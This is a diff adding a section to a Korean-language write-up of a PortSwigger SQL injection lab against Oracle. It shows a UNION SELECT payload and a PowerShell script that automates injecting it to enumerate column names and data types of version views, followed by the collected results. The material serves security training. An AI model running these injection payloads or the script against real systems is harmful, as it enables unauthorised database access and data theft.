@@ -69,6 +69,143 @@ filter?category=' OR 1=1 --
 
 ![UNION SELECT로 뷰 이름 조회에 성공한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)
 
+### 4. 뷰별 칼럼명·데이터 타입 수집 및 JSON 저장
+
+앞서 얻은 뷰 이름 중 버전과 관련 있어 보이는 9개를 대상으로, PowerShell 반복문을 사용하여 칼럼명과 데이터 타입을 조회했다.
+
+**사용한 쿼리 형태**
+
+```sql
+' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name = '뷰이름'--
+```
+
+`column_name`과 `data_type`을 각각 하나의 열로 반환하도록 했다. 응답 HTML의 `is-table-longdescription` 테이블에서 `<th>`는 칼럼명, `<td>`는 데이터 타입으로 읽었다.
+
+**수집 및 저장 방식**
+
+1. `$viewNames`에 저장한 9개 뷰 이름을 순회한다.
+2. 뷰 이름을 쿼리에 넣고 `category` 값을 URL 인코딩하여 같은 실습 세션으로 요청한다.
+3. `Parse-Table` 함수로 응답 표의 각 행을 읽고, 태그 제거·HTML 엔티티 디코딩·공백 정리를 수행한다.
+4. 각 행을 `viewName`, `column_name`, `data_type` 속성이 있는 객체로 만든다.
+5. 모든 결과를 배열에 모아 `ConvertTo-Json`으로 변환하고, 현재 작업 폴더의 `results.json`에 UTF-8로 저장한다.
+
+**실행 코드**
+
+> 아래 코드는 실행에 사용한 코드이며, 세션 토큰만 기록용 자리표시자로 바꿨다.
+
+```powershell
+function Parse-Table {
+    param(
+        [string]$html,
+        [string]$viewName
+    )
+
+    $clean = {
+        param($text)
+        $text = [regex]::Replace($text, '<[^>]+>', '')
+        $text = [System.Net.WebUtility]::HtmlDecode($text)
+        ([regex]::Replace($text, '\s+', ' ')).Trim()
+    }
+
+    $table = [regex]::Match(
+        $html,
+        '(?is)<table\b[^>]*class="is-table-longdescription"[^>]*>(.*?)</table>'
+    )
+
+    foreach ($row in [regex]::Matches($table.Groups[1].Value, '(?is)<tr\b[^>]*>(.*?)</tr>')) {
+        $th = [regex]::Match($row.Value, '(?is)<th\b[^>]*>(.*?)</th>')
+        $td = [regex]::Match($row.Value, '(?is)<td\b[^>]*>(.*?)</td>')
+
+        [pscustomobject]@{
+            viewName    = $viewName
+            column_name = & $clean $th.Groups[1].Value
+            data_type   = & $clean $td.Groups[1].Value
+        }
+    }
+}
+
+# 1. 요청 설정 (세션 토큰은 기록용으로 마스킹)
+$baseUrl      = "https://0aca007f03d03d92807f261e00a3004a.web-security-academy.net"
+$sessionToken = "<실습 세션 토큰>"
+
+# 2. 세션 및 쿠키 설정
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36"
+
+$cookie = New-Object System.Net.Cookie(
+    "session",
+    $sessionToken,
+    "/",
+    ([uri]$baseUrl).Host
+)
+$session.Cookies.Add($cookie)
+
+$viewNames = @(
+    'ALL_FILE_GROUP_VERSIONS'
+    'ALL_TYPE_VERSIONS'
+    'GV_$VERSION'
+    'PRODUCT_COMPONENT_VERSION'
+    'SM_$VERSION'
+    'USER_FILE_GROUP_VERSIONS'
+    'USER_TYPE_VERSIONS'
+    'V_$VERSION'
+    '_ALL_FILE_GROUP_VERSIONS'
+)
+
+$results = @(
+    foreach ($viewName in $viewNames) {
+        $category = "' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name = '$viewname'--"
+
+        # 3. category 값을 URL 인코딩하여 요청 주소 구성
+        $encodedCategory = [uri]::EscapeDataString($category)
+        $requestUrl = "$baseUrl/filter?category=$encodedCategory"
+
+        # 4. 요청 실행
+        $requestParams = @{
+            Uri             = $requestUrl
+            Method          = "GET"
+            WebSession      = $session
+            UseBasicParsing = $true
+            Headers         = @{
+                "Accept"          = "text/html"
+                "Accept-Language" = "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"
+                "Cache-Control"   = "no-cache"
+                "Pragma"          = "no-cache"
+            }
+        }
+
+        $response = Invoke-WebRequest @requestParams
+
+        # 5. 응답 HTML에서 열 정보 추출
+        $html = $response.Content
+        Parse-Table -html $html -viewName $viewName
+    }
+)
+
+ConvertTo-Json -InputObject $results -Depth 5 |
+    Set-Content ".\results.json" -Encoding UTF8
+```
+
+**관찰 결과**
+
+위 코드로 칼럼명과 데이터 타입을 얻어 `results.json`으로 저장했다. 첨부한 결과 화면에서 확인한 항목은 다음과 같다.
+
+| 뷰 이름 | 칼럼명 | 데이터 타입 |
+| --- | --- | --- |
+| `ALL_FILE_GROUP_VERSIONS` | `COMMENTS` | `VARCHAR2` |
+| `ALL_FILE_GROUP_VERSIONS` | `CREATED` | `TIMESTAMP(6) WITH TIME ZONE` |
+| `ALL_FILE_GROUP_VERSIONS` | `CREATOR` | `VARCHAR2` |
+| `ALL_FILE_GROUP_VERSIONS` | `DEFAULT_DIRECTORY` | `VARCHAR2` |
+| `ALL_FILE_GROUP_VERSIONS` | `FILE_GROUP_NAME` | `VARCHAR2` |
+| `ALL_FILE_GROUP_VERSIONS` | `FILE_GROUP_OWNER` | `VARCHAR2` |
+| `ALL_FILE_GROUP_VERSIONS` | `VERSION` | `NUMBER` |
+| `ALL_FILE_GROUP_VERSIONS` | `VERSION_NAME` | `VARCHAR2` |
+| `ALL_TYPE_VERSIONS` | `HASHCODE` | `RAW` |
+
+위 표는 스크린샷에 보이는 결과 일부다. 현재 단계에서는 뷰의 칼럼 구조를 확보했으며, 데이터베이스 버전 문자열을 표시해 실습을 해결했는지는 아직 기록하지 않았다.
+
+![뷰별 칼럼명과 데이터 타입을 results.json에 저장한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/02-column-names-and-data-types-json.png)
+
 ## 해결 과정
 
 ## 배운 점
